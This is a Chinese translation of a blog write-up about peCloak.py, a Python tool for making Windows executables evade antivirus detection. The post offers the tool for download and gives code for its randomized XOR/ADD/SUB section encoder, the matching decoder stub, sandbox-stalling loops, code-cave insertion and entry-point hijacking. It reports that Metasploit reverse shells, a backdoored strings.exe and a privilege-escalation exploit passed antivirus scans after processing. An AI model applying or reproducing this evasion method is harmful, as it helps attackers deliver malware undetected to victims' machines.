# peCloak.py – 一次免杀尝试过程

0x00 前言
=====

From: http://www.securitysift.com/pecloak-py-an-experiment-in-av-evasion/

在开始实验之前，得先说明这并不是真正意义上的实验。

并且这个实验前提也很简单：AV 查杀很大程度上依赖文件特征，应用程序沙盒/动态查杀。

因此我也很自信如果通过修改可执行文件的部分以及一些基础实用的沙盒绕过方法就可以使大部分客户端AV失效。

我整理了下面这些条件：

*   1.修改过的PE文件必须可躲避常见且最新版本的AV查杀。
*   2.编码过的payload必须可以正常无错运行，因为AV的拦截而导致的无法运行则认为是失败的。
*   3.免杀的整个过程(编码，解码等)必须是自动化的，代码运行无须任何手动操作或调试器参与。

0x01 测试环境
=====

Windows XP SP3虚拟机，Kali Linux。

Payload:

*   两个metasploit payload(meterpreter_reverse_tcp 与shell_reverse_tcp)
*   一个本地提权exploit[(KiTrap0D aka”vdmallowed”)](http://www.exploit-db.com/exploits/11199/)
*   一个含 reverse_tcp后门的可执行文件(strings.exe from sysinternals)

这些修改编码操作都可以被验证有效。

0x02 免杀过程
=====

为了成功免杀，我列出了一些重要的点。

首先，我需要改善之前一些会被特征查杀的编码或加密操作。另外我又给自己一个限制，在编码器中我只能用一些简单的xor，add，或者sub指令。不是因为其他的操作复杂，而只是为了证明躲避特征查杀编码操作并不需要那么复杂。

其次，我需要绕过反病毒软件的沙盒侦查，启发式查杀操作。

最后，我想尽量减少可执行文件中解码/启发式代码特征防止其成为一种被查杀特征。

0x03 peClock.py
=====

为了满足所有要求，我写了一个python脚本，叫做“peCloak”。尽管我大致的完成了基本操作，但还是要清楚大块花了一个星期的时间，所以代码还有很多需要完善的地方。而且我也没打算将它作为Veil Framework的替代，所以我并不打算长久的维护这个脚本。这是个简单的自动化免杀脚本，而且这只是我实验中小小的一次开发过程。但我仍希望我用的这些方法便于你深入的理解免杀的世界。

请注意使用该脚本你需要自行解决下面的依赖关系：

[pydasm](http://sourceforge.net/projects/winappdbg/files/additional%20packages/PyDasm/)[pefile](https://code.google.com/p/pefile/downloads/list)[SectionDoubleP](http://git.n0p.cc/?p=SectionDoubleP.git;a=summary)

程序下载[peCloak.py](http://static.wooyun.org/drops/20150319/2015031906251514640peCloak.py_.zip)

尽管我并不会深入的讲解所有的代码内容(作为一个beta版本，代码的注释已经写的很清楚了)。

接下来随我了解一些我使用的免杀方法吧！

0x04 编码
=====

为了防止特征化查杀，选择一些编码方式是很重要的，在我强加的条件中有提到只用一些简单的add，sub，xor指令。动态的选择编码顺序，我想出了下面这个非常简单的方法 (函数内容有简要删减)：

```
def build_encoder():
 
    encoder = []
    encode_instructions = ["ADD","SUB","XOR"] # possible encode operations
    num_encode_instructions = randint(5,10) # determine the number of encode instructions
 
    # build the dynamic portion of the encoder
    while (num_encode_instructions > 0):
        modifier = randint(0,255)

        # determine the encode instruction
        encode_instruction = random.choice(encode_instructions)
        encoder.append(encode_instruction + " " + str(modifier)) 

        num_encode_instructions -= 1

        ... snip ...
 
    return encoder

```

它满足我所有的标准 —— 数增化为一系列简单随机的的数、顺序、操作符的操作。

编码过程发生在脚本运行读取文件内容时并且逐字节编码指定的块，默认的，脚本将会编码包含可执行代码的PE块（比如 .text或者 .code）。但这里是可自定义的。这里使用pefile模块来做文件模块寻找检索工作。

具体内容可以看下面encode_data函数的简要：

```
data_to_encode = retrieve_data(pe, section_name, "virtual") # grab unencoded data from section
 
... snip ...
 
# generate encoded bytes
 count = 0 
 for byte in data_to_encode:
    byte = int(byte, 16)
 if (count >= encode_offset) and (count < encode_length + encode_offset):
    enc_byte = do_encode(byte, encoder)
 else:
    enc_byte = byte
 count += 1
 encoded_data = encoded_data + "{:02x}".format(enc_byte)

 # make target section writeable
 make_section_writeable(pe, section_name)

 # write encoded data to image
 print "[*] Writing encoded data to file"
 raw_text_start = section_header.PointerToRawData # get raw text location for writing directly to file
 pe.set_bytes_at_offset(raw_text_start, binascii.unhexlify(encoded_data))

```

0x05 解码
=====

解码操作相对来说也很简单，它只是编码的逆过程。指令的顺序也是相反的(FIFO 先入先出)并且指令本身也必须取逆操作(add变成sub，sub变成add，xor不变)。下面是一个编码和解码的相对操作过程。

| Encoder | Decoder |
| --- | :-: |
| ADD 9 | SUB 7 |
| SUB 3 | XOR 3F |
| XOR 2E | ADD 1 |
| ADD 12 | SUB 12 |
| SUB 1 | XOR 2E |
| XOR 3F | ADD 3 |
| ADD 7 | SUB 9 |

解码函数大致看起来如下：

```
get_address:
   mov eax, decode_start_address     ; Move address of sections's first encoded byte into EAX
 
decode:                              ; assume decode of at least one byte 
   ...dynamic decode instructions... ; decode operations + benign fill
   inc eax                           ; increment decode address
   cmp eax, encode_end_address       ; check address with end_address
   jle, decode                       ; if in range, loop back to start of decode function
   ...benign filler instructions...  ; additional benign instructions that alter signature of decoder

```

为了完成解码器，我简单的使用了一个字典含有各种编码操作的逆操作。并使用之前编码时用的次数循环创建对应的解码器。这也是非常有必要的，因为编码器每次都是动态创建的(因此也不同)。

```
def build_decoder(pe, encoder, section, decode_start, decode_end):

    decode_instructions = {
                                "ADD":"\x80\x28", # add encode w/ corresponding decoder ==> SUB BYTE PTR DS:[EAX] 
                                "SUB":"\x80\x00",   # sub encode w/ corresponding add decoder ==> ADD BYTE PTR DS:[EAX]
                                "XOR":"\x80\x30" # xor encode w/ corresponding xor decoder ==> XOR BYTE PTR DS:[EAX]
                           }
 
    decoder = ""
    for i in encoder:
        encode_instruction = i.split(" ")[0] # get encoder operation
        modifier = int(i.split(" ")[1])      # get operation modifier
        decode_instruction = (decode_instructions[encode_instruction] + struct.pack("B", modifier)) # get corresponding decoder instruction
        decoder = decode_instruction + decoder # prepend the decode instruction to execute in reverse order

        # add some fill instructions
        fill_instruction = add_fill_instructions(2)
        decoder = fill_instruction + decoder

    mov_instruct = "\xb8" + decode_start # mov eax, decode_start
    decoder = mov_instruct + decoder  # prepend the decoder with the mov instruction 
    decoder += "\x40" # inc eax
    decoder += "\x3d" + decode_end # cmp eax, decode_end
    back_jump_value = binascii.unhexlify(format((1 << 16) - (len(decoder)-len(mov_instruct)+2), 'x')[2:]) # TODO: keep the total length < 128 for this short jump
    decoder += "\x7e" + back_jump_value # jle, start_of_decode 
    decoder += "\x90\x90" # NOPS

    return decoder

```

0x06 Heuristic 绕过
=====

Heuristic 绕过也只不过是一系列指令循环执行诱导AV以为可执行文件已经运行。NOPS, INC/DEC, ADD/SUB, PUSH/POP 指令都是可行的。就像编码过程一样，首先生成一个伪随机数决定起始指令的顺序，然后与递增和比较指令相配对（当然这一过程也是在某个范围中随机产生）创建有限的迭代循环。

循环的次数在脚本运行前定义，但是要记住循环次数越多，时间也就越长。

```
def generate_heuristic(loop_limit):
 
    fill_limit = 3 # the maximum number of fill instructions to generate in between the heuristic instructions
    heuristic = ""
    heuristic += "\x33\xC0"                                                         # XOR EAX,EAX
    heuristic += add_fill_instructions(fill_limit)                                  # fill
    heuristic += "\x40"                                                             # INC EAX
    heuristic += add_fill_instructions(fill_limit)                                  # fill
    heuristic += "\x3D" + struct.pack("L", loop_limit)                              # CMP EAX,loop_limit
    short_jump = binascii.unhexlify(format((1 << 16) - (len(heuristic)), 'x')[2:])  # Jump immediately after XOR EAX,EAX
    heuristic += "\x75" + short_jump                                                # JNZ SHORT 
    heuristic += add_fill_instructions(fill_limit)                                  # fill
    heuristic += "\x90\x90\x90"                                                     # NOP
    return heuristic
 
'''
    This is a very basic attempt to circumvent remedial client-side sandbox heuristic scanning
    by stalling program execution for a short period of time (adjustable from options)
'''
def build_heuristic_bypass(heuristic_iterations):
 
    # we only need to clear these registers once
    heuristic_start = "\x90\x90\x90\x90\x90\x90" # XOR ESI,ESI
    heuristic_start += "\x31\xf6"                # XOR ESI,ESI
    heuristic_start += "\x31\xff"                # XOR EDI,EDI
    heuristic_start += add_fill_instructions(5)

    # compose the various heuristic bypass code segments  
    heuristic = ""  
    for x in range(0, heuristic_iterations):
        loop_limit = randint(286331153, 429496729)
        heuristic += generate_heuristic(loop_limit) #+ heuristic_xor_instruction
    print "[*] Generated Heuristic bypass of %i iterations" % heuristic_iterations
    heuristic = heuristic_start + heuristic 
    return heuristic

```

heuristic和解码器中调用的add_fill_instructions()函数只是简单的从前文开始处字典中随机选择指令(inc/dec, push/pop, 等)。

0x07 开辟代码区
=====

最终代码所做的就是编码设定的PE文件块，然后插入一个包含heuristic bypass 和相对应的译码器的代码区，这个代码区所在的位置由脚本运行时检索PE文件每块中连续的空字节的最小数量(当前是1000)决定的。如果发现，脚本就会使这个部分标记为可执行，然后在该位置插入代码。否则脚本将会创建一个使用SectionDoubleP代码的新块(名为”.NewSection”)。当然你也可以选择 –a | -add 参数将代码插入一个已存在的块中（或许会损坏文件）。

0x08 跳向代码区
=====

为了跳入代码区，改变PE文件的执行流需要修改ModuleEntryPoint,这个过程有两点需要注意: 创建跳转指令需要使用之前创建代码区的地址。

保留ModuleEntryPoint处修改前的指令，这样不会影响原来的运行。

之后的函数相对来说比较简单，引入pydasm库读出入口处的指令并获取其相对应的汇编代码。

```
ef preserve_entry_instructions(pe, ep, ep_ava, offset_end):
    offset=0
    original_instructions = pe.get_memory_mapped_image()[ep:ep+offset_end+30]
    print "[*] Preserving the following entry instructions (at entry address %s):" % hex(ep_ava)
    while offset < offset_end:
        i = pydasm.get_instruction(original_instructions[offset:], pydasm.MODE_32)
        asm = pydasm.get_instruction_string(i, pydasm.FORMAT_INTEL, ep_ava+offset)
        print "\t[+] " + asm
        offset += i.length

    # re-get instructions with confirmed offset to avoid partial instructions
    original_instructions = pe.get_memory_mapped_image()[ep:ep+offset]
    return original_instructions

```

这个函数很重要的一方面是可以保证保留了全部的指令。比如，假设开始时入口处的指令是：

```
6A 60              PUSH 60
68 28DF4600        PUSH pe.0046DF28

```

如果你的代码区覆盖了5字节，你仍想保证开始两条指令的7个字节，但是就会出现多余的坏字符。

0x09 恢复执行流
=====

这一点，块入口包括跳转指令跳转到代码区的heuristic bypass函数部分，然后会继续解码PE文件编码过的部分，一旦完成，执行流就会转向回起初的位置这样文件就可以按照本身的内容运行。这是含有两步动作的作业： 重运行覆盖的原始指令。

跳回块的入口点（抵消添加的代码块跳转）

事实上因为包含相对的 jump/call指令重运行原始指令会变的很复杂。这些jump/call指令需要就现在的代码区偏移位置重新计算。

依赖原始跳转目的地址和现在代码区的地址重新计算这些相对跳转指令我得以解决了这个问题。

```
current_address = int(code_cave_address, 16) + heuristic_decoder_offset  + prior_offset + added_bytes

# check opcode to see if it's is a relative conditional or unconditional jump 
if opcode in conditional_jump_opcodes:
    new_jmp_loc = update_jump_location(asm, current_address, 6)
    new_instruct_bytes = conditional_jump_opcodes[opcode] + struct.pack("l", new_jmp_loc) # replace short jump with long jump and update location
elif opcode in unconditional_jump_opcodes:
    new_jmp_loc = update_jump_location(asm, current_address, 5)
    new_instruct_bytes = unconditional_jump_opcodes[opcode]  + struct.pack("l", new_jmp_loc) # replace short jump with long jump and update locatio
else:
    new_instruct_bytes = instruct_bytes

```

conditional_jump_opcodes 和unconditional_jump_opcodes 变量只是存了各自的操作码。调用的update_jump_location 函数也很简单：

```
def update_jump_location(asm, current_address, instruction_offset):
    jmp_abs_destination = int(asm.split(" ")[1], 16) # get the intended destination
    if jmp_abs_destination < current_address:
        new_jmp_loc = (current_address - jmp_abs_destination + instruction_offset ) * -1 # backwards jump
    else:
        new_jmp_loc = current_address - jmp_abs_destination + instruction_offset # forwards jump

    return new_jmp_loc

```

0x10 其他特点
=====

正如我所做的任何事，通常都会有一些拓展所以在这个工具中我也加入了一些其他功能辅 助分析目标文件。比如在测试中有的时候我想能够看到PE文件的某部分来确定是什么诱发 了特征检测所以我加入了一个简单的十六进制文本查看器。

0x11 保存修改过的PE文件
=====

之前写过一篇笔记提到想要从自己修改的函数中获取更多的信息我不得不轻微的修改pefile库。特别是当我查看issue时发现当pefile 保存一个修改过的文件时，它会覆盖块结构数据上的几个字节。换句话说，如果你修改了某给定文件.rdata块的前50个字节，修改过的东西将会被原始的块头替换。对此，我给pefile 的write()函数加了一个附加参数(SizeofHeaders)。这样我就可以保留PE文件头然后替换我想要部分：

![enter image description here](http://drops.javaweb.org/uploads/images/5cf051c27dac67b73e252c8ac6207c0c4cc2a144.jpg)

同样，字符串也会被覆盖所以我又对write()函数做了点修改：

![enter image description here](http://drops.javaweb.org/uploads/images/b299193055fd05a7267a9024849bad1c65575cbc.jpg)

根据你修改的程度，额外的修改也许是有必要的，虽然这两处修改也可以满足简单的测试。

0x12 更详细的说明 & 结束
=====

假如你想用peCloak或者你自己的工具免杀，下面的这些就是准确使用peCloak操作的参数，还有一些需要记住的： * 首先我并没有包含每次扫描结果的截图作为免杀的证据，这样会使这篇文章篇幅过长，虽然我确实展示了一张示例图说明免杀的结果。

*   其次我使用用来编码的大多数字节范围并不是优化过的。比如，如果编码.rdata块0字节到500字节就会免杀失败，只是文件还是正常运行了。我并没有深入测试哪个字节导致了失败，就将这个练习交给大家了。
    
*   最后文中当我提到peCloak默认设置时，我是指heuristic bypass 的level为3(-H 3)而且只编码.text块。这就是如果你不带额外参数运行脚本时的默认设定。
    

另外，作为提醒，下面四个文件是测试通过的：

*   av_test_msfmet_rev_tcp.exe – Metasploit Meterpreter reverse_tcp executable
*   av_test_msfshell_rev_tcp.exe – Metasploit reverse tcp shell executable
*   strings_evil.exe – strings.exe backdoored with Metasploit reverse_tcp exploit
*   vdmallowed.exe – local Windows privilege escalation exploit

前三个文件是直接由metasploit生成的，第三个由源代码编译，除了peCloak没有用其他工具处理过。